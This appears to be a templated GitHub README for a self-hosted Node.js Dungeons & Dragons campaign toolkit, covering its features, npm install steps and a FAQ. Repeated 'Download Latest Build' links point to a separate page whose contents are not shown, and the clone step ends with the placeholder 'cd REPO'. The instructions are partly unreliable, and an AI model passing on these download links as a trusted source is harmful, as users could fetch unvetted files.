# D&D Campaign Tools - Tabletop RPG Campaign Toolkit 2026

> **D&D Campaign Tools is a self-hosted Node.js workspace for Dungeon Masters, bringing campaign mapping, character management, campaign utilities, and collaborative dice rolling together in the current 2026 release.**

[![Platform](https://img.shields.io/badge/Platform-Node.js-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Unversioned-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/danielybhayes3665/dnd-campaign-map-tools?style=flat-square)](https://github.com/danielybhayes3665/dnd-campaign-map-tools)

---

<p align="center">
  <a href="https://danielybhayes3665.github.io/dnd-campaign-map-tools/">
    <img src="https://img.shields.io/badge/Download-D%26D%20Campaign%20Tools%20Latest-brightgreen?style=for-the-badge" alt="Download D&D Campaign Tools">
  </a>
</p>

> **[Download D&D Campaign Tools](https://danielybhayes3665.github.io/dnd-campaign-map-tools/)**

---

[Download Latest Build](https://danielybhayes3665.github.io/dnd-campaign-map-tools/)

---

## Overview

D&D Campaign Tools provides a browser-based home for everyday Dungeon Master tasks. The toolkit includes regional and town map views, hex exploration, location details, NPC and monster records, character creation, and a shared dice roller built for D&D 5e play.

Designed for self-hosted Node.js deployments, the project combines an Express server, SQLite-compatible storage through sql.js, vanilla JavaScript, and Server-Sent Events to keep connected tools updated. Its bundled, self-contained demo dataset lets you inspect the application before adding your own campaign material.

---

## What It Includes

- Navigate regional and town maps using interactive hex grids and location details.
- Choose which map information is exposed to players and other participants.
- Record NPCs and monsters with portraits and private notes for the Dungeon Master.
- Create characters with a guided step-by-step workflow.
- Manage ability scores, skills, saving throws, and spellcasting details.
- Share dice rolls, including advantage, disadvantage, and damage expressions.
- Synchronize connected campaign tools using live updates.
- Explore the included demo campaign without requiring an initial data setup.

---

## Getting Started

First, clone the repository and enter its directory:

```bash
git clone https://github.com/danielybhayes3665/dnd-campaign-map-tools.git
cd REPO
```

Install the required packages:

```bash
npm install
```

Launch the application with the configured start command:

```bash
npm start
```

After the server starts, visit the local address it reports in your browser. For projects using another script name, check `package.json` to see which commands are available.

---

## Typical Workflow

A session with the toolkit may look like this:

1. Run the Node.js server.
2. Open the campaign workspace in a browser.
3. Inspect the supplied demo campaign or start entering your own campaign information.
4. Browse the map atlas across regions, towns, hexes, and individual locations.
5. Create NPC and monster entries with portraits and Dungeon Master-only notes.
6. Create characters or examine existing character statistics.
7. Roll checks, saving throws, attacks, and damage with the shared dice tool.
8. Leave connected views open whenever synchronized updates between tools are needed.

---

## Setup and Data

Runtime options and application settings come from the repository's project files and configuration. Before starting a self-hosted installation, review `package.json` for scripts and examine the server-side configuration.

The campaign data layer uses SQLite-compatible handling. The included demo records can serve as an initial example; configure or replace that content to match the campaign and installation you are running.

---

## Requirements

- A Node.js runtime
- npm or another compatible package manager for Node.js
- A web browser for accessing the campaign interface
- Local storage for application data and uploaded portraits
- A network environment that allows the application server and its live Server-Sent Events connection to communicate

---

## Frequently Asked Questions

### What kind of user is this toolkit designed for?

D&D Campaign Tools is aimed at Dungeon Masters who prefer one self-hosted workspace for maps, characters, creatures, notes, and dice rolling during sessions.

### Is the toolkit intended for D&D 5e?

Yes. Its campaign workflow covers D&D 5e-oriented information such as ability scores, skills, saving throws, spellcasting, NPCs, monsters, and dice expressions.

### What is the update process?

Get the newest project files, reinstall dependencies if necessary, and launch the server with the appropriate project script. Before replacing an existing installation, review repository changes carefully so current campaign data is not unintentionally affected.

### Where does the application keep campaign configuration?

The project setup and server-side data layer define configuration and storage behavior. Review the repository configuration files and `package.json` to locate the applicable scripts and storage settings.

### What can I do if the server will not launch?

Verify that Node.js is installed, run `npm install`, and examine the terminal output for errors. Also confirm that the selected port is free. If the problem remains, review the project scripts and server configuration.

### What could prevent connected views from synchronizing?

Updates rely on an active Server-Sent Events connection. Check the browser's connection, confirm that the server is running, and inspect network or proxy configuration that could be blocking or terminating the event stream.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
